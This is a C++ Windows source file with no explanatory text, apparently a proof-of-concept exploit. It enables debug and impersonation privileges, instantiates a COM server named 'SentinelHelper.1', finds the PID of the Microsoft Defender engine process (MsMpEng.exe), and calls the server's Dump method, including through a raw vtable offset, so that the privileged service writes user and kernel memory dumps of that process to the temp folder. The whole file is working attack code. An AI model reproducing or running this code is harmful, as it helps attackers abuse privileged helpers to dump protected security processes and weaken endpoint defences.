#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <comdef.h>
#include <oleauto.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

#pragma pack(push, 8)
typedef struct _MINIDUMP_EXCEPTION_INFORMATION {
    DWORD ThreadId; DWORD _pad;
    PVOID ExceptionPointers;
    DWORD ClientPointers; DWORD _pad2;
} MEI;
#pragma pack(pop)

typedef HRESULT (STDMETHODCALLTYPE *DumpFn)(
    void* This, ULONG ProcessId,
    BSTR UserDumpFileName, BSTR KernelDumpFileName,
    CHAR F3, CHAR F4, ULONG F5, CHAR F6,
    SAFEARRAY* P7, SAFEARRAY* P8, MEI* P9);

static bool EnablePrivilege(const wchar_t* name)
{
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, name, &luid)) {
        CloseHandle(hToken); return false;
    }
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    SetLastError(0);
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}

static void SetProxySecurity(IUnknown* pUnk, const wchar_t* tag)
{
   
    HRESULT hr = CoSetProxyBlanket(
        pUnk,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        nullptr,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING);

    std::wcout << L"[*] CoSetProxyBlanket(" << tag << L") -> 0x"
               << std::hex << hr << std::dec;
    if (FAILED(hr)) {
        std::wcout << L"  (trying without DYNAMIC_CLOAKING)";
        hr = CoSetProxyBlanket(pUnk, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                               nullptr, RPC_C_AUTHN_LEVEL_CALL,
                               RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
        std::wcout << L"  -> 0x" << std::hex << hr << std::dec;
    }
    std::wcout << std::endl;
}

static void DumpFull(IDispatch* pCustom, DWORD pid,
                     const std::wstring& up, const std::wstring& kp,
                     const wchar_t* tag)
{
    void** vtbl = *(void***)pCustom;
    DumpFn fn = (DumpFn)vtbl[64 / sizeof(void*)];

    BSTR bUp = SysAllocString(up.c_str());
    BSTR bKp = SysAllocString(kp.c_str());
    MEI mei = { 0 };

    std::wcout << L"[*] " << tag << L"  Dump -> ";
    HRESULT hr = fn(pCustom, pid, bUp, bKp, 0, 0, 0, 0, nullptr, nullptr, &mei);
    std::wcout << L"0x" << std::hex << hr << std::dec;
    if (SUCCEEDED(hr)) std::wcout << L"  *** SUCCESS ***";
    std::wcout << std::endl;

    SysFreeString(bUp);
    SysFreeString(bKp);
}

int wmain()
{
    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_IMPERSONATE_NAME);


    HRESULT hrInit = CoInitializeSecurity(
        nullptr,                      
        -1,                           
        nullptr,
        nullptr,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,  
        nullptr,
        EOAC_DYNAMIC_CLOAKING,        
        nullptr);

    std::wcout << L"[*] CoInitializeSecurity -> 0x"
               << std::hex << hrInit << std::dec << std::endl;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);


    CLSID clsid;
    CLSIDFromProgID(L"SentinelHelper.1", &clsid);
    IDispatch* pParent = nullptr;
    HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER,
                                  IID_IDispatch, (void**)&pParent);
    if (FAILED(hr)) { std::wcerr << L"[-] CoCreate failed\n"; return 1; }

    SetProxySecurity((IUnknown*)pParent, L"parent");


    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { 0 }; pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"MsMpEng.exe") == 0) {
                pid = pe.th32ProcessID; break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (!pid) { std::wcerr << L"[-] no such a process\n"; return 1; }
    std::wcout << L"[*] process PID: " << pid << std::endl;

    wchar_t t[MAX_PATH]; GetTempPathW(MAX_PATH, t);
    std::wstring up = std::wstring(t) + L"imp_u.dmp";
    std::wstring kp = std::wstring(t) + L"imp_k.dmp";


    LPOLESTR mn = (LPOLESTR)L"Dump";
    DISPID dispid;
    hr = pParent->GetIDsOfNames(IID_NULL, &mn, 1, LOCALE_USER_DEFAULT, &dispid);
    if (SUCCEEDED(hr)) {
        VARIANT a[3];
        for (int i = 0; i < 3; ++i) VariantInit(&a[i]);
        a[2].vt = VT_UI4; a[2].ulVal = pid;
        a[1].vt = VT_BSTR; a[1].bstrVal = SysAllocString(up.c_str());
        a[0].vt = VT_BSTR; a[0].bstrVal = SysAllocString(kp.c_str());

        DISPPARAMS p = { a, NULL, 3, 0 };
        VARIANT r; VariantInit(&r);
        EXCEPINFO ex = { 0 }; UINT ae = 0;
        hr = pParent->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT,
                             DISPATCH_METHOD, &p, &r, &ex, &ae);
        std::wcout << L"[*] parent.Dump(via IDispatch) -> 0x"
                   << std::hex << hr << std::dec << L" argErr=" << ae;
        if (SUCCEEDED(hr)) std::wcout << L"  *** SUCCESS ***";
        std::wcout << std::endl;
        if (ex.scode) std::wcout << L"    scode=0x" << std::hex << ex.scode << std::dec << std::endl;
        if (ex.bstrDescription) std::wcerr << L"    desc: " << ex.bstrDescription << std::endl;
        for (int i = 0; i < 3; ++i) VariantClear(&a[i]);
        VariantClear(&r);
    }


    LPOLESTR gd = (LPOLESTR)L"GetDumper";
    pParent->GetIDsOfNames(IID_NULL, &gd, 1, LOCALE_USER_DEFAULT, &dispid);
    DISPPARAMS pd = { NULL, NULL, 0, 0 };
    VARIANT r2; VariantInit(&r2);
    EXCEPINFO ex2 = { 0 }; UINT ae2 = 0;
    hr = pParent->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD,
                         &pd, &r2, &ex2, &ae2);
    IDispatch* pDumper = (r2.vt == VT_DISPATCH) ? r2.pdispVal : nullptr;

    if (pDumper) {
        IID dumperIID = { 0x3458E8E5, 0xEBBF, 0x48F9,
            { 0xBC, 0x7C, 0xFF, 0xD8, 0x1A, 0x08, 0xEA, 0x46 } };
        void* pCustom = nullptr;
        if (FAILED(pDumper->QueryInterface(dumperIID, &pCustom)))
            pCustom = pDumper;

        SetProxySecurity((IUnknown*)pCustom, L"dumper");
        DumpFull((IDispatch*)pCustom, pid, up, kp, L"[vtable]");
    }

    if (pDumper) pDumper->Release();
    pParent->Release();
    CoUninitialize();

    Sleep(3000);
    for (auto& p : { up, kp }) {
        LARGE_INTEGER sz = { 0 };
        HANDLE hf = CreateFileW(p.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            GetFileSizeEx(hf, &sz);
            CloseHandle(hf);
            std::wcout << L"[+] " << p << L"  ->  " << sz.QuadPart << L" bytes\n";
        }
    }

    std::wcout << L"\nPress Enter...\n";
    std::cin.get();
    return 0;
}